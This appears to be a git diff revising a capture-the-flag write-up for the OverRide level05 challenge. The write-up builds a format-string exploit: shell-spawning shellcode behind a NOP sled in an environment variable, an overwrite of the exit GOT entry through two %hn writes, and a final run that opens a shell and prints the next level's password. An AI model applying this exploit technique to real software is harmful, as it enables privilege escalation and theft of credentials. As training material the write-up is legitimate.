@@ -63,14 +63,14 @@ level05@OverRide:~$ objdump -R level05 | grep exit
 080497e0 R_386_JUMP_SLOT   exit
 ```
 
-We now have an address for `exit` (`0x080497e0`), and we need to provide a payload that contains a shellcode.
+We now have an address for `exit` (`0x080497e0`), and we need to provide a payload that contains a shellcode. In this case, we'll use a noop-sled in order to ensure our shellcode gets run correctly.
 
 ```
 # our shellcode
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 
 # store create payload that stores shellcode
-export PAYLOAD=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+export PAYLOAD=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
 ```
 
 With the shellcode stored into the environment variable, a program can be written to access the address of the shellcode.
@@ -86,65 +86,54 @@ int main(int argc, char *argv[])
 	return (0);
 }
 level05@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv  # NOTE: for 32bit
-level05@OverRide:~$ export PAYLOAD=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+level05@OverRide:~$ export PAYLOAD=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
 level05@OverRide:/tmp$ ./getenv PAYLOAD
-env address: 0xffffdf9f                                    # NOTE: will change per machine
-### remember, the env. variable will change of the execution point, so let's run the program on different location ###
-level05@OverRide:~$ /tmp/getenv PAYLOAD
-0xffffdefd
+env address: 0xffffdbb7                                    # NOTE: will change per machine
 ```
 
-We now have address we want to overwrite (`exit`: `0x080497e0`) and the data we want to write (`PAYLOAD`: `0xffffdefd`).
+We now have address we want to overwrite (`exit`: `0x080497e0`) and the data we want to write (`PAYLOAD`: `0xffffdbb7`).
 
-Unfortunately, `0xffffdefd` is quite large in decimal (`4294959007`), and it doesn't make sense to print that many characters in order to write the correct value with `printf`'s `%n` functionality. (Theoretically it would take approximately 7 minutes, but we'll count that as too long for our purposes.)
+Unfortunately, `0xffffdbb7` is quite large in decimal (`4294958007`), and it doesn't make sense to print that many characters in order to write the correct value with `printf`'s `%n` functionality. (Theoretically it would take approximately 7 minutes, but we'll count that as too long for our purposes.)
 
 Instead, we'll write the number as two separate `printf` `%n` exploits by splitting the number into two `short`s instead of an `int`. Our exploit will be in the following format:
 
 ```
 AAAABBBB                        %n                                   %n
     ^ Points to second short    ^ After [first short value] bytes    ^ After [second short value] bytes
-^ Points to first short           Takes AAAA as "param"          Takes BBBB as "param"
+^ Points to first short           Takes AAAA as "param"                Takes BBBB as "param"
 ```
-
-XXX: ntoe use of `%57077u%10$hn`
-
 Here's the process for splitting the `int` into two `short`s:
 
-| Step                        | First `short`          | Second `short`                                                                          |
-|-----------------------------|------------------------|-----------------------------------------------------------------------------------------|
-| Breaking the number down    | `0xffffdf9f`<br>`^^^^` | `0xffffdf9f`<br>`------^^^^`                                                            |
-| `short` value to write      | `0xffff`               | `0xdf9f`                                                                                |
-| Flip endian-ness            | `                      |                                                                                         |
-| Where we'll write to        | `0x080497e0`           | `0x080497e0` + 2 bytes = `0x080497e2`<br>We add 2 bytes because it's the second `short` |
-| Argument offset (see below) | 10                     | 11                                                                                      |
-
-
-
+| Step                                              | First `short`                                                                     | Second `short`                                                                          |
+|---------------------------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------|
+| Splitting the `int` (and moving to little-endian) | `0xffffdbb7`: original<br>`------^^^^`: selection<br>`------1122`: order of bytes | `0xffffdbb7`: original<br>`--^^^^----`: selection<br>`--1122----`: order of bytes       |
+| Little-endian `short` value to write              | `0xdbb7`                                                                          | `0xffff`                                                                                |
+| Decimal value of the hex `short`                  | `56247`                                                                           | `65535`                                                                                 |
+| How many bytes written before?                    | 2 pointers (4 bytes each) = `8` bytes                                             | `56247` bytes                                                                           |
+| Number of `char`s to pad up to                    | `56247` - `8` = `56239`                                                           | `65535` - `56247` = `9288`                                                             |
+| Address to write to                               | `0x080497e0`                                                                      | `0x080497e0` + 2 bytes = `0x080497e2`<br>Note: We add 2 bytes because it's the second `short` |
+| Argument offset (see below)                       | 10                                                                                | 11                                                                                      |
 
 We need to find where in memory our string is being stored in order to pass in our own input as "arguments" into `printf`. Let's find out the offset we need to pass into `printf`.
 
 ```
-level05@OverRide:~$ echo "AAAABBBB %x %x %x %x %x %x %x %x %x %x %x %x" | ./level05
-aaaabbbb 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 62626262 20782520
+level05@OverRide:~$ echo "AAAABBBB %x %x %x %x %x %x %x %x %x %x %x" | ./level05
+aaaabbbb 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 62626262
 ```
 
 So our two offsets are 10 and 11.
 
+We'll need to print a certain number of characters before each `%n`. Instead of using Python to print these (which would be relatively slow), we'll use the zero padding (`%0`) functionality of `printf`. For example, `%015x` prints the stack where the first argument to `printf` would be (if there was one), zero-padded to be a total of `15` characters. We specify the offsets with the `$` functionality of `printf`.
 
-
-
-
-Because the address too big, we overwrite the target 2 bytes each time. (the first 4 bytes of address can be ignored)
-
-for the first 2 bytes, we input the data `0xdefd - 0x8 = 0xebb5 (57077)` (because what the payload will prit out is 8 bytes=> XXXX that creates the offset of the printf already, and each address is 4 bytes XXXXXXX), then we overwrite the next two bytes `0xffff - 0xdefd = 0x2102 (8450)`
-
-let's try out
+Lights, camera, action!
 
 ```
-level05@OverRide:~$ echo $(python -c 'from struct import pack; print(pack("I", 0x080497e0) + pack("I", 0x080497e2) + "%57077u%10$hn" + "%8450u%11$hn")') | ./level05
-[...]
-[...]
-[...]
+level05@OverRide:~$ (python -c 'from struct import pack; print(pack("I", 0x080497e0) + pack("I", 0x080497e2) + "%056239u%10$hn" + "%09288u%11$hn")'; cat -) | ./level05
+[...]00004160551616
+whoami
+level06
+cat /home/users/level06/.pass
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+^C
 level05@OverRide:~$
 ```
